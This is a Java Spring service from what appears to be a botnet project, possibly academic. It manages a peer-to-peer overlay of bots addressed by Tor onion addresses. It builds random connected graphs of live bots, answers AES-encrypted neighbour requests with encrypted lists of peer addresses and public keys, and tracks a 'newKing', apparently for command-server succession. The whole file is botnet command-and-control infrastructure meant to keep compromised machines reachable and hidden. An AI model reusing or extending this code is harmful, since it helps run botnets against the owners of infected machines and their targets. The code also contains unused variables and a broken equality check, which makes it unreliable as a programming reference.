package cs.sii.service.connection;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import cs.sii.domain.OnionAddress;
import org.jgrapht.UndirectedGraph;
import org.jgrapht.graph.DefaultEdge;
import org.jgrapht.graph.ListenableUndirectedGraph;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.control.command.MyGnmRandomGraphDispenser;
import cs.sii.control.command.MyVertexFactory;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;

@Service("P2PMan")
public class P2PMan {

	private UndirectedGraph<OnionAddress, DefaultEdge> graph;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private NetworkService nServ;

	private String newKing = "";

	public UndirectedGraph<OnionAddress, DefaultEdge> getGraph() {
		return graph;
	}

	public void setGraph(UndirectedGraph<OnionAddress, DefaultEdge> graph) {
		this.graph = graph;
	}

	public void initP2P() {
		graph = createNetworkP2P();
		System.out.println("Grafo completato " + graph);
		System.out.println("Inizio calcolo vicini");
		if (graph.degreeOf(nServ.getMyOnion()) > 0) {
			nServ.setNeighbours(myNeighbours(nServ.getMyOnion().getOnion()));
			for (int i = 0; i < nServ.getNeighbours().getSize(); i++) {
				Pairs<OnionAddress, PublicKey> p = nServ.getNeighbours().get(i);
				System.out.println("Ip vicinato= " + p.getValue1());
			}
		}
	}

	/**
	 * @param nodes
	 * @return
	 */
	private Integer calculateK(Integer nodes) {
		Integer k = (int) Math.ceil(Math.log10(nodes + 10));
		if (nodes > 3) {
			k++;
		} else if (nodes == 2) {
			k = 1;
		} else {
			k = 0;
		}
		return k;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<OnionAddress, DefaultEdge> createNetworkP2P() {
		// creo grafo partenza
		graph = new ListenableUndirectedGraph<OnionAddress, DefaultEdge>(DefaultEdge.class);

		ArrayList<OnionAddress> nodes = new ArrayList<OnionAddress>();

		System.out.println("Nodes Size: " + nodes.size());
		MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		MyVertexFactory<OnionAddress> nodeIp = new MyVertexFactory<OnionAddress>((List<OnionAddress>) nodes.clone(), new SecureRandom());

		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
		System.out.println("create/update graph" + graph);
		System.out.println("minium degree " + calculateK(nodes.size()));
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<OnionAddress, DefaultEdge> updateNetworkP2P() {

		SyncIpList<OnionAddress, String> bots = nServ.getAliveBot();
		ArrayList<OnionAddress> nodes = new ArrayList<OnionAddress>();

		for (int i = 0; i < bots.getSize(); i++) {
			Pairs<OnionAddress, String> bot = bots.get(i);
			if (nodes.indexOf(bot.getValue1()) < 0) {
				nodes.add(bot.getValue1());
				System.out.println("AGGIUNGO ONION ADDRESS A VERTICI " + bot.getValue1());
			}

		}

		MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
		ListenableUndirectedGraph<OnionAddress, DefaultEdge> graph2 = new ListenableUndirectedGraph<OnionAddress, DefaultEdge>(DefaultEdge.class);
		MyVertexFactory<OnionAddress> nodeIp2 = new MyVertexFactory<OnionAddress>((List<OnionAddress>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0, new SecureRandom(), false, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (OnionAddress ip2 : nodes) {
			//TODO aggiungere stampa per sapere i vertici se serve
			System.out.println("gli archi di "+ip2+": "+ graph2.degreeOf(ip2));
			Set<DefaultEdge> test2=graph2.edgesOf(ip2);

		}
		System.out.println("create/update graph" + graph);
		System.out.println("minium degree " + calculateK(nodes.size()));
		this.graph = graph2;



		Set<DefaultEdge> test=graph2.edgeSet();




		Set<DefaultEdge> setEd = graph2.edgesOf(nServ.getMyOnion());



		nServ.setNeighbours(myNeighbours(nServ.getMyOnion().getOnion()));
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<OnionAddress, DefaultEdge> updateNetworkP2P(UndirectedGraph<OnionAddress, DefaultEdge> graph) {

		SyncIpList<OnionAddress, String> bots = nServ.getAliveBot();
		ArrayList<OnionAddress> nodes = new ArrayList<OnionAddress>();

		for (int i = 0; i < bots.getSize(); i++) {
			Pairs<OnionAddress, String> bot = bots.get(i);
			if (nodes.indexOf(bot.getValue1()) < 0) {
				nodes.add(bot.getValue1());
				System.out.println("AGGIUNGO IP A VERTICI " + bot.getValue1());
			}
		}

		MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<OnionAddress, DefaultEdge> graph2 = new ListenableUndirectedGraph<OnionAddress, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<OnionAddress> nodeIp2 = new MyVertexFactory<OnionAddress>((List<OnionAddress>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0, new SecureRandom(), false, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (OnionAddress ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("create/update graph" + graph);
		System.out.println("minium degree " + calculateK(nodes.size()));
		this.graph = graph2;
		nServ.setNeighbours(myNeighbours(nServ.getMyOnion().getOnion()));
		return graph;
	}


	@SuppressWarnings("unchecked")
	public UndirectedGraph<OnionAddress, DefaultEdge> updateNetworkP2P(List<Pairs<OnionAddress, OnionAddress>> edge, List<OnionAddress> bots) {

		ArrayList<OnionAddress> nodes = new ArrayList<OnionAddress>();

		for (int i = 0; i < bots.size(); i++) {
			OnionAddress bot = bots.get(i);
			if (nodes.indexOf(bot) < 0) {
				nodes.add(bot);
				System.out.println("AGGIUNGO IP A VERTICI " + bot);
			}
		}

		MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<OnionAddress, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), false, false);
		ListenableUndirectedGraph<OnionAddress, DefaultEdge> graph2 = new ListenableUndirectedGraph<OnionAddress, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<OnionAddress> nodeIp2 = new MyVertexFactory<OnionAddress>((List<OnionAddress>) nodes, new SecureRandom());
		for (OnionAddress ip : nodes) {
			graph.addVertex(ip);
		}
		for (Pairs<OnionAddress, OnionAddress> pair : edge) {
			graph.addEdge(pair.getValue1(), pair.getValue2());
		}
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (OnionAddress ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("create/update graph" + graph);
		System.out.println("minium degree " + calculateK(nodes.size()));
		this.graph = graph2;
		nServ.setNeighbours(myNeighbours(nServ.getMyOnion().getOnion()));
		return graph;
	}

	/**
	 * @param data
	 * @return
	 * @throws BadPaddingException
	 * @throws IllegalBlockSizeException
	 * @throws InvalidAlgorithmParameterException
	 * @throws UnsupportedEncodingException
	 * @throws NoSuchPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeyException
	 */
	public byte[] getNeighbours(String data) {
		String idBot;
		Bot bot = null;
		idBot = pki.getCrypto().decryptAES(data);
		if (idBot == null)
			return null;
		System.out.println("decripted get neigh from id bot " + idBot);
		bot = bServ.searchBotId(idBot);

		if (bot == null) {
			return null;// non autenticato
		} else {
			System.out.println(" Onion Address of bot who made request " + bot.getOnionAddress());
			if (graph.containsVertex(new OnionAddress(bot.getOnionAddress()))) {
				Set<DefaultEdge> neighbours = graph.edgesOf(new OnionAddress(bot.getOnionAddress()));
				if (neighbours.size() < calculateK(nServ.getAliveBot().getSize())) {
					updateNetworkP2P();
				}
			} else {
				updateNetworkP2P();
			}
		}

		Set<DefaultEdge> setEd = graph.edgesOf(new OnionAddress(bot.getOnionAddress()));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		ArrayList<Object> ipN = new ArrayList<Object>();
		for (int i = 0; i < a.length; i++) {

			OnionAddress s = graph.getEdgeSource(a[i]);
			OnionAddress t = graph.getEdgeTarget(a[i]);
			if (!s.equals(new OnionAddress(bot.getOnionAddress()))) {
				Bot sB = bServ.searchBotOnionAddress(s);
				System.out.println("add neigh of " + bot.getOnionAddress() + " " + s);
				ipN.add(new Pairs<String, String>(sB.getOnionAddress(), (sB.getPubKey())));
			}
			if (!t.equals(new OnionAddress(bot.getOnionAddress()))) {
				System.out.println("add neigh of " + bot.getOnionAddress() + " " + t);
				Bot tB = bServ.searchBotOnionAddress(t);
				ipN.add(new Pairs<String, String>(tB.getOnionAddress(), tB.getPubKey()));
			}

		}
		ByteArrayOutputStream ostream = new ByteArrayOutputStream();
		try {
			pki.getCrypto().encrypt(ipN, ostream);
			ByteArrayInputStream kk = new ByteArrayInputStream(ostream.toByteArray());

			if (ostream.equals(pki.getCrypto().decrypt(kk)))
				System.out.println("tutt'apposto");

		} catch (IOException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException
				| InvalidAlgorithmParameterException e) {
			System.out.println("fail encrypt neighbours");
		}

		return ostream.toByteArray();
	}

	public SyncIpList<OnionAddress, PublicKey> myNeighbours(String data) {


		OnionAddress cappelloputtana=new OnionAddress(data);
		Set<DefaultEdge> setEd = graph.edgesOf(new OnionAddress(data));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		SyncIpList<OnionAddress, PublicKey> ipN = new SyncIpList<OnionAddress, PublicKey>();

		for (int i = 0; i < a.length; i++) {

			OnionAddress s = graph.getEdgeSource(a[i]);
			OnionAddress t = graph.getEdgeTarget(a[i]);
			if (!s.equals(new OnionAddress(data))) {
				Bot sB = bServ.searchBotOnionAddress(s);
				Pairs<OnionAddress, PublicKey> ps = new Pairs<OnionAddress, PublicKey>();
				ps.setValue1(new OnionAddress(sB.getOnionAddress()));
				System.out.println("nuovi vicini " + sB.getOnionAddress());
				ps.setValue2(pki.rebuildPuK(sB.getPubKey()));
				ipN.add(ps);

			}
			if (!t.equals(new OnionAddress(data))) {
				Bot tB = bServ.searchBotOnionAddress(t);
				Pairs<OnionAddress, PublicKey> pt = new Pairs<OnionAddress, PublicKey>();
				pt.setValue1(new OnionAddress(tB.getOnionAddress()));
				System.out.println("nuovi vicini " + tB.getOnionAddress());
				pt.setValue2(pki.rebuildPuK(tB.getPubKey()));
				ipN.add(pt);
			}

		}

		return ipN;
	}
	//

	public String getNewKing() {
		return newKing;
	}

	public void setNewKing(String newKing) {
		this.newKing = newKing;
	}

}
